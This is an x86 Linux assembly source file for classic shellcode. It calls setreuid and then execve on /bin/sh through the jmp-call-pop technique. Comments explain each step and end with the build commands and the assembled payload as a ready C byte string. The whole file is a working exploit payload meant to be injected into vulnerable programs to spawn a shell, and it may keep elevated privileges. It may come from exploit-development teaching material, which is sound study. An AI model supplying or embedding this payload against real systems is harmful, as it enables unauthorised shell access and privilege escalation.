;shellex.asm
[SECTION .text]

global _start


_start:
        xor eax, eax
        mov al, 70              ;setreuid is syscall 70
        xor ebx, ebx
        xor ecx, ecx
        int 0x80

        jmp short ender

        starter:

        pop ebx                 ;get the address of the string
        xor eax, eax

        mov [ebx+7 ], al        ;put a NULL where the N is in the string
        mov [ebx+8 ], ebx       ;put the address of the string to where the
                                ;AAAA is
        mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is
        mov al, 11              ;execve is syscall 11
        lea ecx, [ebx+8]        ;load the address of where the AAAA was
        lea edx, [ebx+12]       ;load the address of the NULLS
        int 0x80                ;call the kernel, WE HAVE A SHELL!

        ender:
        call starter
        db '/bin/shNAAAABBBB'

;nasm -f elf shellex.asm
;ld -m elf_i386 -s -o shellex shellex.o
;objdump -d shellex
;char shellcode[] =  "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"\
;	                  "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"\
;                    "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"\
;            	      "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"\
;	                  "\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";
